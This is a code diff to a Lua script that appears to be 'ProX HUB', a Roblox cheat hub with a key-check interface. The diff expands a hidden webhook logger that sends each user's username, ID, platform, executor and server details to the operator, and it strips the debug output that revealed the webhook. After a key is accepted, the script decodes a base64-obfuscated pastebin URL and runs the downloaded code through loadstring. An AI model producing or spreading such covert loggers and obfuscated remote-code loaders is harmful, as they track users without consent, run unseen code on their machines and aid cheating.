@@ -368,15 +368,21 @@ local function getAvatarUrl(userId)
     return string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", userId)
 end
 
+-- Send webhook
 local function sendWebhook(action)
     local executor = getExecutor()
     local gameInfo = getGameInfo()
     local timestamp = os.date("%Y-%m-%d %H:%M:%S", os.time())
+    
+    local isPrivateServer = game.PrivateServerId ~= nil
+    local isStudio = game:GetService("RunService"):IsStudio()
+    local platform = game:GetService("UserInputService"):GetPlatform()
+    
     local embedColor = EXECUTOR_COLORS[executor] or 0x000000
 
     local payload = {
         ["username"] = "ProX | Logger",
-        ["avatar_url"] = getAvatarUrl(LocalPlayer.UserId),
+        ["avatar_url"] = "https://i.imgur.com/5X7pG7s.jpeg",
         ["embeds"] = {{
             ["title"] = "ProX HUB Log",
             ["url"] = gameInfo.url,
@@ -385,8 +391,12 @@ local function sendWebhook(action)
             ["fields"] = {
                 {
                     ["name"] = "User Info",
-                    ["value"] = string.format("**Username:** [%s](https://www.roblox.com/users/%d/profile)\n**Display Name:** %s",
-                        LocalPlayer.Name, LocalPlayer.UserId, LocalPlayer.DisplayName),
+                    ["value"] = string.format(
+                        "**Username:** [%s](https://www.roblox.com/users/%d/profile)\n" ..
+                        "**Display Name:** %s\n" ..
+                        "**Platform:** %s",
+                        LocalPlayer.Name, LocalPlayer.UserId, LocalPlayer.DisplayName, platform
+                    ),
                     ["inline"] = true
                 },
                 {
@@ -396,22 +406,28 @@ local function sendWebhook(action)
                 },
                 {
                     ["name"] = "Game Info",
-                    ["value"] = string.format("[%s](%s)\n**Place ID:** %d\n**Server ID:** %s",
-                        gameInfo.name, gameInfo.url, gameInfo.placeId, gameInfo.jobId),
+                    ["value"] = string.format(
+                        "[%s](%s)\n" ..
+                        "**Place ID:** %d\n" ..
+                        "**Server ID:** %s\n" ..
+                        "**Server Type:** %s\n" ..
+                        "**Running in Studio:** %s",
+                        gameInfo.name, gameInfo.url, gameInfo.placeId, gameInfo.jobId,
+                        isPrivateServer and "Private" or "Public", isStudio and "Yes" or "No"
+                    ),
                     ["inline"] = false
                 }
             },
-            ["thumbnail"] = {["url"] = getGameThumbnail(gameInfo.placeId)},
-            ["footer"] = {["text"] = string.format("ProX Logger • %s", timestamp), ["icon_url"] = getAvatarUrl(LocalPlayer.UserId)},
+            ["thumbnail"] = { ["url"] = gameInfo.thumbnailUrl },
+            ["footer"] = {
+                ["text"] = string.format("ProX Logger • %s", timestamp),
+                ["icon_url"] = getAvatarUrl(LocalPlayer.UserId)
+            },
             ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ", os.time())
         }}
     }
 
-    -- 🔎 Debug print
-    print("Webhook URL:", WebhookURL)
-    print("Sending payload:", HttpService:JSONEncode(payload))
-
-    local success, response = pcall(function()
+    local success, err = pcall(function()
         return http_request({
             Url = WebhookURL,
             Method = "POST",
@@ -421,12 +437,9 @@ local function sendWebhook(action)
     end)
 
     if not success then
-        warn("❌ Failed to send webhook:", response)
-    else
-        print("✅ Webhook response:", response.StatusCode or "nil", response.Body or "no body")
+        warn("Failed to send webhook:", err)
     end
 end
-
 
 local PREMIUM_URL = base64Decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1Byb1hTQy9Qcm9YRGF0YS9yZWZzL2hlYWRzL21haW4vUHJlbWl1bUxpc3Q=")
 
@@ -669,7 +682,6 @@ local function createKeySystem()
         local glowTween = TweenService:Create(GlowStroke, TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true, 0), {Transparency = 0.5})
         glowTween:Play()
         
-        -- Animate the StatusFrame strokes to match
         local statusColorTween = TweenService:Create(StatusAnimatedStroke, tweenInfo, {Color = accentColor, Transparency = 0.2})
         local statusThicknessTween = TweenService:Create(StatusAnimatedStroke, tweenInfo, {Thickness = 2})
         statusColorTween:Play()
@@ -710,14 +722,15 @@ local function createKeySystem()
     animateButtonPop(CheckButton)
     animateButtonPop(GetKeyButton)
     animateButtonPop(DiscordButton)
+    animateButtonPop(KeyBox)
 
     local function showStatus(message, isError)
         StatusLabel.Text = message
         StatusLabel.TextColor3 = isError and Color3.fromRGB(255, 80, 80) or Color3.fromRGB(80, 255, 80)
         StatusLabel.Visible = true
 
-        StatusFrame.BackgroundTransparency = 0 -- Reverted to a static color
-        StatusLabel.TextTransparency = 0 -- No longer animating transparency
+        StatusFrame.BackgroundTransparency = 0 
+        StatusLabel.TextTransparency = 0 
         
         delay(3, function()
             StatusLabel.Visible = false
@@ -747,8 +760,8 @@ local function createKeySystem()
         if success then
             showStatus("Key is Valid! Loading...", false)
             wait(1)
+            showStatus("Successfully logged", false)
             animateOutAndDestroy()
-            showStatus("Successfully logged as Free user", false)
             sendWebhook("Successfully logged as Free user")
             loadstring(game:HttpGet(base64Decode("aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2dLTjZUd0c4"), true))()
         end
